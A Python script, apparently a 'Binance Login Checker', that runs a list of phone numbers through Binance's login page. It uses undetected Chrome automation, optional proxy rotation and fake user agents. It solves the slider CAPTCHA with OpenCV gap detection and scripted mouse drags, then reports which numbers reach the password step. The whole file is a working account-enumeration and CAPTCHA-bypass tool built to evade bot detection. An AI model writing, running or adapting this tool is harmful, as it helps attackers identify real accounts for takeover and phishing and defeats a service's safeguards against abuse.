# Python 3.9
# Binance Login Checker
# Version: 1.0
from selenium import webdriver
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import ElementNotInteractableException
from selenium.common.exceptions import MoveTargetOutOfBoundsException
from selenium.common.exceptions import StaleElementReferenceException
from selenium.common.exceptions import WebDriverException
import re
from termcolor import colored
import time
import os
import requests
import cv2
import math
import numpy as np
from PIL import Image
from io import BytesIO
from sklearn.cluster import KMeans
from goto import with_goto
import random
from goto import goto, label

CAPTCHA_PATH = 'captcha.png'
COUNTRY_NAME = "39-IT-Italy (Italia)" #the name of country to set (+XXXX) for login process

def select_random_proxy():
	with open('proxy.txt', 'r') as f:
		proxies = [line.strip() for line in f]
		if not proxies:
			raise ValueError('List of proxies is empty.')
		return proxies.pop(random.randrange(len(proxies)))

with open('accounts.txt', 'r') as accounts:	
	lines = accounts.readlines()
	for line in lines:		
		f = " ".join(line.split())
		line = f
		if len(line) < 4:
			continue
		line = line[2:]
		options = uc.ChromeOptions()
		from fake_useragent import UserAgent
		ua = UserAgent()
		user_agent = ua.random		
		#options.add_argument(f'user-agent={user_agent}') #if you need uncomment it
		#options.add_argument('--proxy-server=http://%s' % (select_random_proxy())) #if you need uncomment it
		driver = uc.Chrome(options=options)
		driver.maximize_window()
		driver.implicitly_wait(15)
		try:
			driver.get("https://accounts.binance.com/en/login")
		except WebDriverException:
			print("Bad proxy skipping..")
			continue
		#enter login
		driver.find_element(By.NAME, 'username').send_keys(line)
		el = driver.find_element(By.CSS_SELECTOR, 'input.bn-sdd-input')
		driver.execute_script("arguments[0].scrollIntoView(true);", el)	
		ActionChains(driver).move_to_element(el).click(el).perform()
		driver.find_element(By.XPATH, '/html/body/div[3]/div[1]/div/div[2]/div/div/div/input').send_keys(COUNTRY_NAME)
		driver.find_element(By.XPATH, '/html/body/div[3]/div[1]/div/div[2]/div/ul').click()
		driver.find_element(By.ID, 'click_login_submit').click()
		time.sleep(2)	
		def solve_captcha():
			try:
				element = driver.find_element(By.CSS_SELECTOR, 'div.bs-main-image')
				bg_image_url = element.value_of_css_property('background-image')
				bg_image_url = bg_image_url.replace('url("', '').replace('")', '')
			except NoSuchElementException:
				return -1
			headers = {
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58..#3029.110 Safari/537.36',
				'Referer': 'https://www.binance.com/'
			}
			image_data = requests.get(bg_image_url, headers=headers).content
			with open(CAPTCHA_PATH, 'wb') as f:
				f.write(image_data)
			time.sleep(2)			
			captcha = cv2.imread(CAPTCHA_PATH, cv2.IMREAD_COLOR)
			captcha = captcha[:, 60:]
			captcha = cv2.resize(captcha, (310, 192), interpolation=cv2.INTER_NEAREST)
			gray = cv2.cvtColor(captcha, cv2.COLOR_BGR2GRAY)
			lower_gray = np.array([70, 70, 70], dtype=np.uint8)
			upper_gray = np.array([180, 180, 180], dtype=np.uint8)
			captcha[captcha[:,:,0] == 153] = [0, 0, 0]
			mask_gray = cv2.inRange(captcha, lower_gray, upper_gray)
			roi_gray = cv2.bitwise_and(gray, gray, mask=mask_gray)
			blur = cv2.GaussianBlur(roi_gray, (3, 3), 0)
			edges = cv2.Canny(blur, 100, 500)
			contours, hierarchy = cv2.findContours(edges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
			e2 = []
			for contour in contours:
				#print(contour.size)
				if contour.size > 25 and contour.size < 250:  # TUNE
					e2.append(contour)
			font = cv2.FONT_HERSHEY_COMPLEX
			cv2.drawContours(captcha, e2, -1, (0, 255, 0), 3)
			total_x = []
			total_y = []
			total_n = 0
			for cnt in e2:
				approx = cv2.approxPolyDP(
					cnt, 0.009 * cv2.arcLength(cnt, True), True)
				n = approx.ravel()
				i = 0
				for j in n:
					if(i % 2 == 0):
						x = n[i]
						y = n[i + 1]
						total_x.append(x)
						total_y.append(y)
						total_n += 1
					i = i + 1
			cords = (min(total_x), (min(total_y)+max(total_y))//2)
			mid_point = cv2.circle(captcha, cords, radius=0, color=(0, 0, 255), thickness=5)
			return min(total_x)-2
		@with_goto
		def solving_captcha():
			label .goto_captcha
			distance = solve_captcha()
			if distance != -1:
				
				slider = driver.find_element(By.CSS_SELECTOR, 'div.bs-slide-thumb')
				action_chains = ActionChains(driver)
				action_chains.move_to_element(slider)
				action_chains.click_and_hold()
				max_distance = 250  # maximum distance the slider can be moved
				max_time = 2.5  # time it takes to move the slider the full distance
				step = 10  # number of pixels to move in one step
				pixel_time = max_time / max_distance
				num_steps = int(distance / step)
				for i in range(num_steps):
					action_chains.move_by_offset(step, 0)
					time.sleep(pixel_time * step)
				remaining_pixels = distance % step
				if remaining_pixels > 0:
					action_chains.move_by_offset(remaining_pixels, 0)
					time.sleep(pixel_time * remaining_pixels)
				action_chains.release()
				action_chains.perform()
				time.sleep(5)
				try:
					driver.find_element(By.CSS_SELECTOR, 'svg.bs-refresh-icon').click()
					print("Try again to solve captcha..")
					goto .goto_captcha
				except NoSuchElementException:
					pass
		solving_captcha()
		if driver.current_url == 'https://accounts.binance.com/en/login-password?':
			print("Working login >>>", line)
		driver.close()
